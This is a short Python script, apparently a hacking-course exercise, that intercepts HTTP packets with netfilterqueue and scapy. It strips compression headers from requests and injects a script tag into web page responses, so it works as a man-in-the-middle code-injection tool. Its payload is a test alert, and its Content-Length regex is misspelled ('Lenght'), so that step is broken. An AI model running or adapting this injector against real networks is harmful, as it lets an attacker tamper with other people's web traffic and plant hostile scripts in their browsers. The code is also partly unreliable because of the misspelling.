import netfilterqueue
import scapy.all as scapy
import re
def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet.haslayer(scapy.TCP):
            load = scapy_packet[scapy.Raw].load
            if scapy_packet[scapy.TCP].dport == 80:  # Check for outgoing requests
                print ("[+] Request ")
                load = re.sub("Accept-Encoding:.*?\\r\\n","",load)
            elif scapy_packet[scapy.TCP].sport == 80:  # Check for incoming responses
                print("[+] Response ")
                injection_code = "<script>alert('test');</script>"
                load = load.replace ("</body>",injection_code + "</body>")
                #print(scapy_packet.show())
                content_length_search = re.search("(?:Content-Lenght:\s)(\d*)",load)
                if content_length_search:
                    content_length = content_length_search.group(1)
                    new_content_lenght =int(content_length) + len(injection_code)
                    load = load.replace(content_length,str(new_content_lenght))
            if load != scapy_packet[scapy.Raw].load :
                new_packet = set_load(scapy_packet,load)
                packet.set_payload(bytes(new_packet))  # Set the modified packet payload
    packet.accept()  # Accept the packet
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
